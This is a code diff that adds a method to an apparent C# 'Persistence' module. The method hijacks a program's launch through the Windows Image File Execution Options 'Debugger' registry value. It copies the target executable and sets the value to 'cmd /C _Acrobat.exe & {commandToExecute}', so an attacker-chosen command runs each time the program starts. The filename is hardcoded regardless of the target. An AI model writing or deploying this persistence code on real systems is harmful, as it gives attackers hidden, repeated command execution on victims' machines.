@@ -44,5 +44,24 @@ namespace Persistence
 
             // subkey.DeleteValue("Debugger");
         }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        public void ExecProgAndCommand(string programName, string commandToExecute)
+        {
+            var pathToFile = Utils.FindFile(programName);
+            var newPathToFile = Path.Combine(pathToFile.Replace(Path.GetFileName(pathToFile), String.Empty), "_" + Path.GetFileName(pathToFile));
+            Console.WriteLine(newPathToFile);
+            File.Copy(pathToFile, newPathToFile);
+
+            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
+                                          true);
+            ArgumentNullException.ThrowIfNull(subkey);
+            Console.WriteLine(@$"cmd /C " + "\"" + newPathToFile + "\"" + " & calc.exe");
+            subkey.SetValue("Debugger", @$"cmd /C _Acrobat.exe & {commandToExecute}", RegistryValueKind.String);
+
+            // subkey.DeleteValue("Debugger");
+        }
     }
 }
